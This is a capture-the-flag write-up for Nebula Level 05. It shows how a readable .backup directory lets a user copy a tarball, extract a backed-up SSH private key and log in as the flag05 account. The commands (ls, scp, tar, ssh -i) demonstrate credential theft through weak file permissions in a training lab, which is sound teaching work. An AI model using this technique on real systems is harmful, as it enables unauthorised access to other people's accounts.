# Level 05

Check the **flag05** home directory. You are looking for weak directory permissions

To do this level, log in as the **level05** account with the password **level05**. Files for this level can be found in /home/flag05.

## Source Code

There is no source code available for this level.

## Writeup

If we do an **ls -lah** command we can discover that there is a directory named **.backup** and we have the permission to access into it:

```bash
level05@nebula:/home/flag05$ ls -lah
total 5.0K
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3.3K 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
```

Go inside the directory and this is his content:

```bash
level05@nebula:/home/flag05/.backup$ ls -lah
total 2.0K
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1.8K 2011-11-20 20:13 backup-19072011.tgz
```

We can download the .tgz file with **scp** command in another terminal:

```bash
scp level05@nebula:/home/flag05/.backup/backup-19072011.tgz .
```

Insert the **level05** password and we now have the .tgz file in out local machine.

Now just unzip the file:

```bash
tar -xvf backup-19072011.tgz
```

We now have a **.ssh** directory that is the backup of the **.ssh** directory of level05 account. It contains this files:

```bash
authorized_keys  id_rsa  id_rsa.pub
```

Make sure that the **id_rsa.pub** key is on append on the **authorized_keys** file:

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLAINcUvucamDG5PzLxljLOJ/nrkzot7EQJ9pEWXoQJC0/ZWm+ezhFHQd5UWlkwPZ2FBDvqxdcrgmmHT/FVGBjK0XWGwIkuJ50nf5pbJExi2SC9kNMMMP2VgY/OxvcUuoGhzEISlgkuu4hJjVh3NeliAgERVzxKCrxSvW48wcAxg4v5vceBra6lY7u8FT2D3VIsHogzKN77Z2g7k2qY82A0vOqw82e/h6IXLjpYwBur0rm0/u3GFB1HFhnAxuGcn4IsnQSBdQCB2S+eOUZ4PmiQ/rUSHuVvMeLCzrxKR+UG9zDwoCwwXpNJehAQJGCiL3JzBNnLjFaylSqKP6xj7cR user@wwwbugs
```

Yes it contains the public key. We can use the private key to login as **flag05** account:

**NB:** use the argument **-o PubkeyAcceptedKeyTypes=+ssh-rsa** because the machine use a deprecated key types

```bash
ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -i id_rsa flag05@nebula
```

We are now inside with **flag05** account:

```bash
flag05@nebula:~$ id
uid=994(flag05) gid=994(flag05) groups=994(flag05)
```

We can now run **getflag** command:

```bash
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```